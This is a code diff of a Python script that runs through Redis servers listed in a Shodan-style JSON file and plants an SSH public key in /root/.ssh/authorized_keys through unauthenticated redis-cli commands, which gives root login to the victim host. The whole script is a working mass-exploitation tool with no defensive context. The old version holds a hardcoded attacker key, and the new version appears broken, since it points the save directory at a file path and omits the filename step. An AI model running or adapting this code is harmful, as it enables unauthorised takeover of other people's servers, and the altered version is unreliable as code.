@@ -1,36 +1,38 @@
-import os
 import json
-from multiprocessing.pool import ThreadPool as Pool
+from subprocess import STDOUT, check_output
 
-def process_thread(ip):
+def process_payload(url):
+    ip_and_port = url.replace('http://', '')
+    if len(ip_and_port) > 25:
+        return
+    if ':' in ip_and_port:
+        ip, port = ip_and_port.split(':')
+    else:
+        print("host error :" + ip_and_port)
+        return
+    print('trying:' + ip + ':' + port)
+    ssh_public_key = ""
+    cmd = "echo '\n\n " + ssh_public_key + "\n\n'|redis-cli -h " + ip + " -p " + port + " -x set test"
+    # cmd = "echo 'bar' | redis-cli -h " + ip + " -p " + port + " -x set foo"
     try:
-        ip = ip.replace('http://', '')
-        if len(ip) > 25:
-            return
-        if ':' in ip:
-            ip, port = ip.split(':')
+        output = check_output(cmd, shell=True, stderr=STDOUT, timeout=5)
+        if 'OK' in str(output, "utf-8"):
+            # print('[+]' + ip_and_port)
+            output = check_output("echo 'config set dir /root/.ssh/authorized_key'|redis-cli -h " + ip + ' -x', shell=True, stderr=STDOUT, timeout=5)
+            if 'OK' in str(output, "utf-8"):
+                output = check_output("echo 'save'|redis-cli -h " + ip + ' -x', shell=True, stderr=STDOUT, timeout=5)
+                print("save db result:" + str(output, "utf-8"))
+                print('[+]', ip, port)
+            else:
+                print(output)
         else:
-            port = 6379
-
-        print('trying:' + ip + ':' + port)
-        result = os.popen(
-            "echo '\n\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAo/Hp7BruXfPnUKuGbPqJTsSmLfh+i9CAGwOFTrEeEaali8s8mLGY99MfaZ9TeddrkuiasAldXpRZgHnPdn6PYDIsptXU/6I9kUuhtKkFZlQlKtt7DTzi5nOkfTV08WTnpDE5JElC15xR+vh35cjnOKXT3piavLnCvKr2BQkie8baHPnX98IaBmhZDB32gqztnVV6r1lUZnEOR/Fs4DmUj94fYw+HSoqRV4R17437FR24R247k14vmA7CsUCRBzQBvBvHUIwuYm7hcvGHXghlrQ5I1KJnFCj5qNegGouIu34nnfMbXleo0ShmsoDfeTCbZIXjPAcqYXvQlrBjNqzJVw== root@XYLink.GW\n\n'|redis-cli -h " + ip + " -p " + port + " -x set test")
-        if 'OK' in result.read():
-            result = os.popen("echo 'config set dir /root/.ssh'|redis-cli -h " + ip + ' -x')
-            if 'OK' in result.read():
-                result = os.popen("echo 'config set dbfilename \'authorized_keys\''|redis-cli -h " + ip + ' -x')
-                result = os.popen("echo 'save'|redis-cli -h " + ip + ' -x')
-                print('[+]', ip, port, result.read())
-    except AssertionError:
-        print('timeout')
+            print(output)
+    except BaseException as e:
+        print(e)
+        return
 
 if __name__ == '__main__':
-    threads = Pool(10)
-    ips = []
-    with open('redis.json','r') as redis_content:
-        ips = json.loads(redis_content.read())
-    for ip in ips:
-        threads.apply_async(process_thread, args=(ip,))
-
-    threads.close()
-    threads.join()
+    with open('shodan.json', 'r') as redis_content:
+        urls = json.loads(redis_content.read())
+        for url in urls:
+            process_payload(url)
